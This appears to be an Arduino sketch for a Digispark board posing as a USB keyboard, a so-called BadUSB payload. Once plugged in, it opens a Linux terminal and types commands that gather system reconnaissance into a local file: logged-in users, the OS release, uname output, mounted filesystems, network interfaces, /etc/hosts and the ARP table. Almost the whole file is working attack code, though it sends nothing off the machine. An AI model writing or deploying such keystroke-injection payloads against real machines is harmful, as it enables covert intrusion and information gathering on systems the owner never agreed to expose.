
#include "DigiKeyboard.h"
#define KEY_UP_ARROW 0x52
#define KEY_DOWN_ARROW 0x51
#define KEY_LEFT_ARROW 0x50
#define KEY_RIGHT_ARROW 0x4F


void setup() {
  // put your setup code here, to run once:
  DigiKeyboard.delay(7000);

   // open terminal
   DigiKeyboard.sendKeyStroke(KEY_T, MOD_ALT_RIGHT | MOD_CONTROL_LEFT); 
   DigiKeyboard.delay(4000);

 

//type echo "Logged in user: " $USER > info_gathering.txt
   
DigiKeyboard.println("users >> info_gathering.txt");
DigiKeyboard.delay(2000);
DigiKeyboard.println ("cat /etc/issue | cut -c1-13 >> info_gathering.txt");
DigiKeyboard.delay(2000);
// uname
DigiKeyboard.println ("echo 'uname results: ' >> info_gathering.txt");
DigiKeyboard.delay(2000);
DigiKeyboard.println("uname -a >> info_gathering.txt");
DigiKeyboard.delay(2000);

DigiKeyboard.println ("echo >> info_gathering.txt");
DigiKeyboard.delay(2000);




// mounted filesystems
DigiKeyboard.println ("echo 'Mounted filesystems: ' >> info_gathering.txt");
DigiKeyboard.delay(2000);

DigiKeyboard.println ("mount -l >> info_gathering.txt");
DigiKeyboard.delay(3000);

// network config
DigiKeyboard.println ("echo 'Network Configuration: ' >> info_gathering.txt");
DigiKeyboard.delay(3000);
DigiKeyboard.println ("ifconfig -a | grep 'Link\|inet' >> info_gathering.txt");
DigiKeyboard.delay(3000);
// hosts
DigiKeyboard.println ("echo 'Print Hosts: ' >> info_gathering.txt");
DigiKeyboard.delay(2000);
DigiKeyboard.println (" cat /etc/hosts >> info_gathering.txt");
DigiKeyboard.delay(2000);

//arp
DigiKeyboard.println ("echo 'Print ARP: ' >> info_gathering.txt");
DigiKeyboard.delay(2000);
DigiKeyboard.println (" arp >> info_gathering.txt");
DigiKeyboard.delay(2000);
DigiKeyboard.println ("echo >> info_gathering.txt");
DigiKeyboard.delay(2000);










   
}

void loop() {
  // put your main code here, to run repeatedly:

}
